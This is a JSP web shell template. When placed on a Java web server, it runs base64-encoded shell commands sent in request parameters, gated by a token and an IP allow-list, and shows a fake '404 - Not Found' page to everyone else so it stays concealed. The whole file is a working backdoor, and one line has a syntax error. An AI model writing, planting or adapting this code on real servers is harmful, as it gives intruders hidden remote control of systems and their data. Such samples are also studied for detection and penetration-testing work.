<%@ page import="java.io.*" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%
BASE64Decoder decoder = new BASE64Decoder();
BASE64Encoder encoder = new BASE64Encoder();
String[] allowsIPs = {${LAUD.IPS}};
String allowedToken = "${LAUD.TOKEN}";
String token = request.getParameter("laudtoken");
String cmd = request.getParameter("laudcmd");
String cwd = request.getParameter("laudcwd");
String lip = request.getRemoteAddr().toString();
boolean debug = false;

if(token!=null && cmd != null && token.equals(allowedToken) && java.util.Arrays.asList(allowsIPs).contains(lip)) {
	File workingDir;

	if(cwd!=null){
	    cwd = new String(decoder.decodeBuffer(cwd);
	}

	if(cwd == null || cwd.equals(".")){
		workingDir = new File("t").getAbsoluteFile().getParentFile();
	} else {
		workingDir = new File(new String(decoder.decodeBuffer(cwd)));
	}
	cmd = new String(decoder.decodeBuffer(cmd));
	if(cmd.startsWith("cd ")){
		String newdir = cmd.substring(3);
		if(newdir.equals("~")){
			workingDir = new File("t").getAbsoluteFile().getParentFile();
		} else if (newdir.startsWith("/")){
			workingDir = new File(newdir);
		} else {
			workingDir = new File(workingDir, newdir);
		}
		
		if(workingDir.exists() && workingDir.isDirectory()){
			out.print(",,"+encoder.encodeBuffer(workingDir.getAbsolutePath().getBytes()));
		} else {
			out.print(","+encoder.encodeBuffer("Directory not found...".getBytes())+",");
		}
	
	}else{
		String[] params = new String[0];
		Process p = Runtime.getRuntime().exec(cmd, params, workingDir);
	
		OutputStream os = p.getOutputStream();
		InputStream in = p.getInputStream();
		DataInputStream dis = new DataInputStream(in);
		String disr = dis.readLine();
		StringBuilder outBuf = new StringBuilder();
		while ( disr != null ) {
			outBuf.append(disr+"\n");
			disr = dis.readLine();
		}
		StringBuilder laudOutput = new StringBuilder();
		laudOutput.append(encoder.encodeBuffer(outBuf.toString().getBytes()));
		laudOutput.append(",,");
		laudOutput.append(encoder.encodeBuffer(workingDir.getAbsolutePath().getBytes()));
	
	 	out.print(laudOutput.toString());
	 	//todo: is p.destroy() required here?
		//todo: capture stderr
	}
	
} else {
	out.println("404 - Not Found");  // todo: return header
	if(debug){
		out.println("<br>Token: " + token);
		out.println("<br>Token Matched?: " + token.equals(allowedToken));
		out.println("<br>IP: " + lip);
		out.println("<br>IP Matched?: " + java.util.Arrays.asList(allowsIPs).contains(lip));
		out.println("<br>cmd: " + cmd);
	}
	
}
%>